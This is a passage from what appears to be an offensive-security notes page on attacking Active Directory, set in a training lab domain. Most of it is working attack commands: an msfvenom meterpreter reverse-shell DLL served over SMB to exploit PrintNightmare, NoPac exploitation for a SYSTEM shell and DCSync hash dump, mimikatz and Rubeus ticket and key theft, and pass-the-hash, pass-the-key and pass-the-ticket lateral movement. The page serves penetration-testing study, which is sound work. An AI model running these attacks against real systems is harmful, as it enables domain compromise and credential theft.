<p><code class="language-plaintext highlighter-rouge">Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.</code></p>

<hr />

<h2 id="vulnerabilities">Vulnerabilities</h2>
<h3 id="printnightmare">PrintNightmare</h3>
<p>PrintNightmare is the nickname given to two vulnerabilities (CVE-2021-34527 and CVE-2021-1675) found in the Print Spooler service that runs on all Windows operating systems. Many exploits have been written based on these vulnerabilities that allow for privilege escalation and remote code execution. Using this vulnerability for local privilege escalation is covered in the Windows Privilege Escalation module, but is also important to practice within the context of Active Directory environments for gaining remote access to a host. Let’s practice with one exploit that can allow us to gain a SYSTEM shell session on a Domain Controller running on a Windows Server 2019 host.</p>

<p>We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.</p>

<h4 id="enumerating-for-ms-rprn">Enumerating for MS-RPRN</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rpcdump.py @172.16.5.5 | egrep <span class="s1">'MS-RPRN|MS-PAR'</span>
</code></pre></div></div>

<h4 id="generating-a-dll-payload">Generating a DLL Payload</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>172.16.5.225 <span class="nv">LPORT</span><span class="o">=</span>8080 <span class="nt">-f</span> dll <span class="o">&gt;</span> backupscript.dll

<span class="nv">$ </span><span class="nb">sudo </span>smbserver.py <span class="nt">-smb2support</span> CompData /path/to/backupscript.dll

use exploit/multi/handler
<span class="nb">set </span>PAYLOAD windows/x64/meterpreter/reverse_tcp

<span class="nv">$ </span><span class="nb">sudo </span>python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 <span class="s1">'\\172.16.5.225\CompData\backupscript.dll'</span>
</code></pre></div></div>

<h3 id="nopac-samaccountname-spoofing">NoPac (SamAccountName Spoofing)</h3>
<p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain. When doing so, we change the name of the new host to match a Domain Controller’s SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC’s name instead of the new name. When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller.</p>

<p>NoPac [https://github.com/Ridter/noPac] uses many tools in Impacket to communicate with, upload a payload, and issue commands from the attack host to the target DC. Before attempting to use the exploit, we should ensure Impacket is installed and the noPac [] exploit repo is cloned to our attack host if needed. We can use these commands to do so:</p>

<p>we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We’ll also notice the ms-DS-MachineAccountQuota number is set to 10. In some environments, an astute sysadmin may set the ms-DS-MachineAccountQuota value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to 0 can prevent quite a few AD attacks.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Scanning for NoPac</span>
<span class="nv">$ </span><span class="nb">sudo </span>python3 scanner.py inlanefreight.local/forend:Klmcargo2 <span class="nt">-dc-ip</span> 172.16.5.5 <span class="nt">-use-ldap</span>

<span class="c"># Running NoPac &amp; Getting a Shell</span>
<span class="nv">$ </span><span class="nb">sudo </span>python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 <span class="nt">-dc-ip</span> 172.16.5.5  <span class="nt">-dc-host</span> ACADEMY-EA-DC01 <span class="nt">-shell</span> <span class="nt">--impersonate</span> administrator <span class="nt">-use-ldap</span>
</code></pre></div></div>
<p>It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use ls to confirm.</p>

<h4 id="using-nopac-to-dcsync-the-built-in-administrator-account">Using noPac to DCSync the Built-in Administrator Account</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 <span class="nt">-dc-ip</span> 172.16.5.5  <span class="nt">-dc-host</span> ACADEMY-EA-DC01 <span class="nt">--impersonate</span> administrator <span class="nt">-use-ldap</span> <span class="nt">-dump</span> <span class="nt">-just-dc-user</span> INLANEFREIGHT/administrator
</code></pre></div></div>

<h3 id="printer-bug">Printer Bug</h3>
<p>The Printer Bug is a flaw in the MS-RPRN protocol (Print System Remote Protocol). This protocol defines the communication of print job processing and print system management between a client and a print server. To leverage this flaw, any domain user can connect to the spool’s named pipe with the RpcOpenPrinter method and use the RpcRemoteFindFirstPrinterChangeNotificationEx method, and force the server to authenticate to any host provided by the client over SMB.</p>

<p>The spooler service runs as SYSTEM and is installed by default in Windows servers running Desktop Experience. This attack can be leveraged to relay to LDAP and grant your attacker account DCSync privileges to retrieve all password hashes from AD.</p>

<p>The attack can also be used to relay LDAP authentication and grant Resource-Based Constrained Delegation (RBCD) privileges for the victim to a computer account under our control, thus giving the attacker privileges to authenticate as any user on the victim’s computer. This attack can be leveraged to compromise a Domain Controller in a partner domain/forest, provided you have administrative access to a Domain Controller in the first forest/domain already, and the trust allows TGT delegation, which is not by default anymore.</p>

<p>We can use tools such as the Get-SpoolStatus module from this tool or [https://github.com/NotMedic/NetNTLMtoSilverTicket] this tool to check for machines vulnerable to the MS-PRN Printer Bug. This flaw can be used to compromise a host in another forest that has Unconstrained Delegation enabled, such as a domain controller. It can help us to attack across forest trusts once we have compromised one forest.</p>

<h3 id="privexchange">PrivExchange</h3>
<p>The PrivExchange attack results from a flaw in the Exchange Server PushSubscription feature, which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.</p>

<p>The Exchange service runs as SYSTEM and is over-privileged by default (i.e., has WriteDacl privileges on the domain pre-2019 Cumulative Update). This flaw can be leveraged to relay to LDAP and dump the domain NTDS database. If we cannot relay to LDAP, this can be leveraged to relay and authenticate to other hosts within the domain. This attack will take you directly to Domain Admin with any authenticated domain user account.</p>

<h3 id="password-in-description-field">Password in Description Field</h3>
<p>Sensitive information such as account passwords are sometimes found in the user account Description or Notes fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.</p>

<h4 id="finding-passwords-in-the-description-field-using-get-domain-user">Finding Passwords in the Description Field using Get-Domain User</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
</code></pre></div></div>

<h3 id="passwd_notreqd-field">PASSWD_NOTREQD Field</h3>
<p>It is possible to come across domain accounts with the passwd_notreqd field set in the userAccountControl attribute. If this is set, the user is not subject to the current password policy length, meaning they could have a shorter password or no password at all (if empty passwords are allowed in the domain). A password may be set as blank intentionally (sometimes admins don’t want to be called out of hours to reset user passwords) or accidentally hitting enter before entering a password when changing it via the command line. Just because this flag is set on an account, it doesn’t mean that no password is set, just that one may not be required. There are many reasons why this flag may be set on a user account, one being that a vendor product set this flag on certain accounts at the time of installation and never removed the flag post-install. It is worth enumerating accounts with this flag set and testing each to see if no password is required (I have seen this a couple of times on assessments). Also, include it in the client report if the goal of the assessment is to be as comprehensive as possible.</p>

<h4 id="checking-for-passwd_notreqd-setting-using-get-domainuser">Checking for PASSWD_NOTREQD Setting using Get-DomainUser</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
</code></pre></div></div>

<hr />

<h1 id="privilege-escalation">Privilege Escalation</h1>
<p>Check <a href="../PrivEsc/Windows.md">Windows Privilege Escalation</a></p>
<ul>
  <li><a href="../PrivEsc/Windows.md#vulnerabilities">Vulnerabilities</a></li>
  <li><a href="../PrivEsc/Windows.md#credential-harvesting">Credential Harvesting</a></li>
</ul>

<hr />

<h1 id="admin-access-on-machine">Admin Access on Machine</h1>
<p>Check <a href="../PrivEsc/Windows.md">Windows Privilege Escalation</a></p>
<ul>
  <li><a href="../PrivEsc/Windows.md#passwords-attacks">Passwords Attacks</a></li>
  <li><a href="../PrivEsc/Windows.md#credential-harvesting">Credential Harvesting</a></li>
</ul>

<h2 id="harvesting-kerberos-tickets-from-windows">Harvesting Kerberos Tickets from Windows</h2>
<p>We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- `Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.`
- `Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.`
</code></pre></div></div>

<p>Before we perform a Pass the Ticket (PtT) attack, let’s see some methods to get a ticket using Mimikatz [https://github.com/ParrotSec/mimikatz] and Rubeus [https://github.com/GhostPack/Rubeus].</p>

<p>On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.</p>

<p>We can harvest all tickets from a system using the Mimikatz module sekurlsa::tickets /export. The result is a list of files with the extension .kirbi, which contain the tickets.</p>

<h3 id="mimikatz---export-tickets">Mimikatz - Export Tickets</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; mimikatz.exe
&gt; privilege::debug
&gt; sekurlsa::tickets /export
&gt; exit
&gt; dir *.kirbi
</code></pre></div></div>

<p>The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user’s name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.</p>

<blockquote>
  <p>Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ren "[0;38319]-2-0-40e10000-tpetty@krbtgt-INLANEFREIGHT.LOCAL.kirbi" new.kirbi  
</code></pre></div></div>

<blockquote>
  <p>Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run “sekurlsa::ekeys” it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.`</p>
</blockquote>

<h3 id="rubeus---export-tickets">Rubeus - Export Tickets</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; Rubeus.exe dump /nowrap
</code></pre></div></div>

<blockquote>
  <p>Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.</p>
</blockquote>

<p>This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let’s see how we can do this using the OverPass the Hash or Pass the Key technique.</p>

<hr />

<h1 id="lateral-movement">Lateral Movement</h1>
<h2 id="credentials-pass-the-hash">Credentials/ Pass The Hash</h2>
<h3 id="validating-the-credentials">Validating the Credentials</h3>
<p>{ldap,mssql,smb,ssh,winrm}</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>crackmapexec &lt;protocol&gt; &lt;ip_range&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">-d</span> &lt;domain&gt;
<span class="nv">$ </span>crackmapexec &lt;protocol&gt; &lt;ip_range&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-H</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span> <span class="nt">-d</span> &lt;domain&gt;

<span class="nv">$ </span>crackmapexec &lt;protocol&gt; &lt;ip_range&gt; <span class="nt">-u</span> &lt;user&gt; <span class="nt">-p</span> &lt;password&gt; <span class="nt">--local-auth</span>
</code></pre></div></div>

<h3 id="mimikatz">Mimikatz</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; kerberos::hash /password:lucky7

&gt; mimikatz.exe
# privilege::debug 
# sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt;
</code></pre></div></div>

<h3 id="smb">SMB</h3>
<p><a href="../Services/SMB.md#remote-code-execution">LateralMovement</a></p>

<h3 id="winrm">WinRM</h3>
<p><strong>Enumerating the Remote Management Users Group</strong></p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-NetLocalGroupMember</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">ACADEMY-EA-MS01</span><span class="w"> </span><span class="nt">-GroupName</span><span class="w"> </span><span class="s2">"Remote Management Users"</span><span class="w">
</span></code></pre></div></div>

<p><strong>Using the Cypher Query in BloodHound</strong></p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">MATCH</span><span class="w"> </span><span class="nx">p1</span><span class="o">=</span><span class="n">shortestPath</span><span class="p">((</span><span class="n">u1:User</span><span class="p">)</span><span class="n">-</span><span class="p">[</span><span class="n">r1</span><span class="p">:</span><span class="n">MemberOf</span><span class="o">*</span><span class="mi">1</span><span class="o">..</span><span class="p">]</span><span class="o">-</span><span class="err">&gt;</span><span class="p">(</span><span class="n">g1:Group</span><span class="p">))</span><span class="w"> </span><span class="n">MATCH</span><span class="w"> </span><span class="nx">p2</span><span class="o">=</span><span class="p">(</span><span class="n">u1</span><span class="p">)</span><span class="n">-</span><span class="p">[:</span><span class="n">CanPSRemote</span><span class="o">*</span><span class="mi">1</span><span class="o">..</span><span class="p">]</span><span class="o">-</span><span class="err">&gt;</span><span class="p">(</span><span class="n">c:Computer</span><span class="p">)</span><span class="w"> </span><span class="kr">RETURN</span><span class="w"> </span><span class="n">p2</span><span class="w">
</span></code></pre></div></div>

<p><a href="../Services/WINRM.md#connecting">WinRM</a></p>

<h3 id="rdp">RDP</h3>
<p><strong>Enumerating the Remote Desktop Users Group</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
</code></pre></div></div>

<p><strong>Checking the Domain Users Group’s Local Admin &amp; Execution Rights using BloodHound</strong>
If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.</p>

<p>We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP</p>

<p><a href="../Services/RDP.md#connecting">RDP</a></p>

<h3 id="mssql">MSSQL</h3>
<p><a href="../Services/SQL.md#mssql">LateralMovement</a></p>

<p>More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.</p>

<p>BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:</p>

<p><strong>Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2
</code></pre></div></div>

<p><strong>Enumerating MSSQL Instances with PowerUpSQL</strong></p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerUpSQL.ps1</span><span class="w">
</span><span class="n">Get-SQLInstanceDomain</span><span class="w">

</span><span class="n">Get-SQLQuery</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="s2">"172.16.5.150,1433"</span><span class="w"> </span><span class="nt">-username</span><span class="w"> </span><span class="s2">"inlanefreight\damundsen"</span><span class="w"> </span><span class="nt">-password</span><span class="w"> </span><span class="s2">"SQL1234!"</span><span class="w"> </span><span class="nt">-query</span><span class="w"> </span><span class="s1">'Select @@version'</span><span class="w">
</span></code></pre></div></div>

<p>We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights.</p>

<p><a href="../Services/SQL.md#xp_cmdshell">xp_cmdshell</a></p>

<hr />

<h2 id="pass-the-key-or-overpass-the-hash">Pass the Key or OverPass the Hash</h2>
<ul>
  <li>https://lisandre.com/archives/14788</li>
  <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/over-pass-the-hash-pass-the-key</li>
  <li>https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/</li>
  <li>https://www.thehacker.recipes/ad/movement/kerberos/ptk</li>
</ul>

<p>The traditional Pass the Hash (PtH) technique involves reusing an NTLM password hash that doesn’t touch Kerberos. The Pass the Key or OverPass the Hash approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full Ticket-Granting-Ticket (TGT).</p>

<p>To forge our tickets, we need to have the user’s hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module sekurlsa::ekeys. This module will enumerate all key types present for the Kerberos package.</p>

<h3 id="mimikatz---extract-kerberos-keys">Mimikatz - Extract Kerberos Keys</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">mimikatz.exe</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">privilege::debug</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">sekurlsa::ekeys</span><span class="w">
</span></code></pre></div></div>

<p>Now that we have access to the AES256_HMAC and RC4_HMAC keys, we can perform the OverPass the Hash or Pass the Key attack using Mimikatz and Rubeus.</p>

<h3 id="mimikatz---pass-the-key-or-overpass-the-hash">Mimikatz - Pass the Key or OverPass the Hash</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">mimikatz.exe</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">privilege::debug</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">sekurlsa::pth</span><span class="w"> </span><span class="nx">/domain:inlanefreight.htb</span><span class="w"> </span><span class="nx">/user:plaintext</span><span class="w"> </span><span class="nx">/ntlm:3f74aa8f08f712f09cd5177b5c1ce50f</span><span class="w">
</span></code></pre></div></div>

<p>This will create a new cmd.exe window that we can use to request access to any service we want in the context of the target user.</p>

<p>To forge a ticket using Rubeus, we can use the module asktgt with the username, domain, and hash which can be /rc4, /aes128, /aes256, or /des. In the following example, we use the aes256 hash from the information we collect using Mimikatz sekurlsa::ekeys.</p>

<h3 id="rubeus---pass-the-key-or-overpass-the-hash">Rubeus - Pass the Key or OverPass the Hash</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/domain:inlanefreight.htb</span><span class="w"> </span><span class="nx">/user:john</span><span class="w"> </span><span class="nx">/aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
</span></code></pre></div></div>

<blockquote>
  <p>Note: Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn’t.</p>
</blockquote>

<blockquote>
  <p>Note: Modern Windows domains (functional level 2008 and above) use AES encryption by default in normal Kerberos exchanges. If we use a rc4_hmac (NTLM) hash in a Kerberos exchange instead of an aes256_cts_hmac_sha1 (or aes128) key, it may be detected as an “encryption downgrade.”</p>
</blockquote>

<h3 id="remotely">Remotely</h3>
<p>I wish to execute this attack remotely then use impacket python script gettgt.py which will use a password, hash or aesKey, it will request a TGT and save it as ccache.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># with an NT hash (overpass-the-hash)</span>
<span class="nv">$ </span>getTGT.py <span class="nt">-dc-ip</span> &lt;IP&gt; <span class="nt">-hashes</span> <span class="s1">':&lt;NTLM hash&gt;'</span> &lt;DOMAIN&gt;/&lt;USER&gt;

<span class="c"># with an AES (128 or 256 bits) key (pass-the-key)</span>
<span class="nv">$ </span>getTGT.py <span class="nt">-dc-ip</span> &lt;IP&gt; <span class="nt">-aesKey</span> <span class="s1">'&lt;aes Key&gt;'</span> &lt;DOMAIN&gt;/&lt;USERNAME&gt;@&lt;IP&gt;
</code></pre></div></div>

<hr />

<h2 id="pass-the-ticket-ptt">Pass the Ticket (PtT)</h2>
<ul>
  <li>https://lisandre.com/archives/14885</li>
  <li>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket
Another method for moving laterally in an Active Directory environment is called a Pass the Ticket (PtT) attack. In this attack, we use a stolen Kerberos ticket to move laterally instead of an NTLM password hash. We’ll cover several ways to perform a PtT attack from Windows</li>
</ul>

<p>Now that we have some Kerberos tickets, we can use them to move laterally within an environment.</p>

<p>With Rubeus we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag /ptt to submit the ticket (TGT or TGS) to the current logon session.</p>

<h3 id="rubeus-pass-the-ticket">Rubeus Pass the Ticket</h3>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; Rubeus.exe asktgt /domain:inlanefreight.htb /user:john /rc4:c4b0e1b10c7ce2c4723b4e2407ef81a2 /ptt
</code></pre></div></div>

<p>Note that now it displays Ticket successfully imported!.</p>

<p>Another way is to import the ticket into the current session using the .kirbi file from the disk.</p>

<p>Let’s use a ticket exported from Mimikatz and import it using Pass the Ticket.</p>

<h3 id="rubeus---pass-the-ticket-using-kirbi">Rubeus - Pass the Ticket using kirbi</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span><span class="mi">6</span><span class="n">c680</span><span class="p">]</span><span class="nt">-2-0-40e10000-plaintext</span><span class="err">@</span><span class="nx">krbtgt-inlanefreight.htb.kirbi</span><span class="w">
</span></code></pre></div></div>

<p>We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.</p>

<h4 id="convert-kirbi-to-base64-format">Convert .kirbi to Base64 Format</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="nx">ToBase64String</span><span class="p">([</span><span class="n">IO.File</span><span class="p">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">"[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"</span><span class="p">))</span><span class="w">
</span></code></pre></div></div>

<p>Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.</p>

<h5 id="pass-the-ticket---base64-format">Pass the Ticket - Base64 Format</h5>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">Ticket</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p>Finally, we can also perform the Pass the Ticket attack using the Mimikatz module kerberos::ptt and the .kirbi file that contains the ticket we want to import.</p>

<h3 id="mimikatz---pass-the-ticket-using-kirbi">Mimikatz - Pass the Ticket using kirbi</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">mimikatz.exe</span><span class="w"> 
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">privilege::debug</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">kerberos::ptt</span><span class="w"> </span><span class="s2">"C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="kr">exit</span><span class="w">
</span></code></pre></div></div>

<blockquote>
  <p>Note: Instead of opening mimikatz.exe with cmd.exe and exiting to get the ticket into the current command prompt, we can use the Mimikatz module misc to launch a new command prompt window with the imported ticket using the misc::cmd command.</p>
</blockquote>

<h3 id="pass-the-ticket-with-powershell-remoting">Pass The Ticket with PowerShell Remoting</h3>
<p>To create a PowerShell Remoting session on a remote computer, you must have administrative permissions, be a member of the Remote Management Users group, or have explicit PowerShell Remoting permissions in your session configuration.</p>

<h4 id="mimikatz---powershell-remoting-with-pass-the-ticket">Mimikatz - PowerShell Remoting with Pass the Ticket</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">mimikatz.exe</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">privilege::debug</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">kerberos::ptt</span><span class="w"> </span><span class="s2">"C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi"</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="kr">exit</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">powershell</span><span class="w">
</span></code></pre></div></div>

<h3 id="rubeus---powershell-remoting-with-pass-the-ticket">Rubeus - PowerShell Remoting with Pass the Ticket</h3>
<h4 id="create-a-sacrificial-process-with-rubeus">Create a Sacrificial Process with Rubeus</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">createnetonly</span><span class="w"> </span><span class="nx">/program:</span><span class="s2">"C:\Windows\System32\cmd.exe"</span><span class="w"> </span><span class="nx">/show</span><span class="w">
</span></code></pre></div></div>

<p>The above command will open a new cmd window. From that window, we can execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session and connect to the DC using PowerShell Remoting.</p>

<h4 id="rubeus---pass-the-ticket-for-lateral-movement">Rubeus - Pass the Ticket for Lateral Movement</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:john</span><span class="w"> </span><span class="nx">/domain:inlanefreight.htb</span><span class="w"> </span><span class="nx">/aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">powershell</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Enter-PSSession</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">DC01</span><span class="w">
</span></code></pre></div></div>

<h3 id="using-impacket-tools">Using Impacket Tools</h3>
<p>With ccache file obtained Passing the Key or Overpassing the Hash, to execute impacket tools, the ccache file needs to be exported to  environment variable.</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ticketConverter.py &lt;kirbi||ccache&gt; &lt;kirbi||ccache&gt;
<span class="nv">$ </span><span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>&lt;path_to_ticket&gt;.ccache
</code></pre></div></div>

<hr />

<h1 id="permissions-move">Permissions Move</h1>
<h2 id="acl-enumeration">ACL Enumeration</h2>
<p>Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the “low hanging fruit” AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:</p>

<p><img src="https://academy.hackthebox.com/storage/modules/143/ACL_attacks_graphic.png" alt="alt text" /></p>

<p>ForceChangePassword abused with Set-DomainUserPassword
Add Members abused with Add-DomainGroupMember
GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
GenericWrite abused with Set-DomainObject
